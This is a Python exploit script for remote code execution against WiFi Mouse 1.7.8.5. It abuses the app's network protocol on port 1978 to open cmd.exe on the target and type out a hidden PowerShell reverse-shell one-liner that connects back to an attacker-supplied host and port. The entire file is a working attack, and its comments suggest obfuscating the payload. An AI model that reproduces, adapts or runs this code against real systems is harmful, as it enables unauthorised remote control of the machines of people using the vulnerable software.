#!/usr/bin/python3

from socket import socket, AF_INET, SOCK_STREAM
from time import sleep
import sys

# WiFi Mouse 1.7.8.5 - Remote Code Execution (Modified for direct reverse shell)

try:
    rhost = sys.argv[1]      # Target IP
    lhost = sys.argv[2]      # Attacker IP for reverse shell
    lport = sys.argv[3]      # Attacker PORT for reverse shell
except:
    print("USAGE: python3 {} <target-ip> <attacker-ip> <attacker-port>".format(sys.argv[0]))
    sys.exit(1)

port = 1978  # WiFi Mouse default port
target = socket(AF_INET, SOCK_STREAM)

# Dictionary mapping ASCII chars to their hex equivalent used by the WiFi Mouse protocol
characters = {
    "A":"41","B":"42","C":"43","D":"44","E":"45","F":"46","G":"47","H":"48","I":"49","J":"4a","K":"4b","L":"4c","M":"4d","N":"4e",
    "O":"4f","P":"50","Q":"51","R":"52","S":"53","T":"54","U":"55","V":"56","W":"57","X":"58","Y":"59","Z":"5a",
    "a":"61","b":"62","c":"63","d":"64","e":"65","f":"66","g":"67","h":"68","i":"69","j":"6a","k":"6b","l":"6c","m":"6d","n":"6e",
    "o":"6f","p":"70","q":"71","r":"72","s":"73","t":"74","u":"75","v":"76","w":"77","x":"78","y":"79","z":"7a",
    "1":"31","2":"32","3":"33","4":"34","5":"35","6":"36","7":"37","8":"38","9":"39","0":"30",
    " ":"20","+":"2b","=":"3d","/":"2f","_":"5f","<":"3c",
    ">":"3e","[":"5b","]":"5d","!":"21","@":"40","#":"23","$":"24","%":"25","^":"5e","&":"26","*":"2a",
    "(":"28",")":"29","-":"2d","'":"27",'"':"22",":":"3a",";":"3b","?":"3f","`":"60","~":"7e",
    "\\":"5c","|":"7c","{":"7b","}":"7d",",":"2c",".":"2e"
}

def openCMD():
    """
    Sends command to open cmd.exe via WiFi Mouse 'openfile' instruction.
    Here we convert the hex string manually with bytes.fromhex().
    """
    hex_data = "6f70656e66696c65202f432f57696e646f77732f53797374656d33322f636d642e6578650a"  
    # "openfile /C/Windows/System32/cmd.exe\n"
    target.sendto(bytes.fromhex(hex_data), (rhost, port))

def SendString(command_string):
    """
    Types out the given string character by character using the WiFi Mouse protocol.
    Each character is turned into hex: '7574663820' + <char hex> + '0a'
      - '7574663820' likely the prefix ("utf8 ")
      - <char hex> is from our dictionary
      - '0a' is a newline
    """
    for char in command_string:
        # If a char is not in the dictionary, it will cause a KeyError. 
        # Make sure your command only uses listed characters or add them if missing.
        combo_hex = "7574663820" + characters[char] + "0a"
        target.sendto(bytes.fromhex(combo_hex), (rhost, port))
        sleep(0.03)

def SendReturn():
    """
    Sends an 'Enter' keypress to execute the typed command.
    '6b657920203352544e' => "key  3RTN"
    """
    target.sendto(bytes.fromhex("6b657920203352544e"), (rhost, port))
    sleep(0.5)

def exploit():
    print("[+] Opening cmd.exe on target ...")
    openCMD()
    sleep(1)

    print("[+] Sending reverse shell command (PowerShell One-Liner) ...")
    
    # Craft a reverse shell one-liner
    # -NoP -NonI => no profile, non-interactive
    # -W Hidden => hide PowerShell window
    # -Exec Bypass => bypass script execution policy
    # -Command => run command string
    
    # This is the classic 'ASCII Reverse Shell' snippet
    # You can shorten or obfuscate, but it should work as-is.
    powershell_cmd = (
        f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command "
        f"\"$client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}}; "
        f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{"
        f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);"
        f"$sendback = (iex $data 2>&1 | Out-String );"
        f"$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';"
        f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
        f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};"
        f"$client.Close()\""
    )

    # Type the command
    SendString(powershell_cmd)
    # Press ENTER
    SendReturn()

    print("[+] Reverse shell command sent. Check your listener on {}:{} ...".format(lhost, lport))

def main():
    target.connect((rhost, port))
    exploit()
    target.close()

if __name__ == "__main__":
    main()
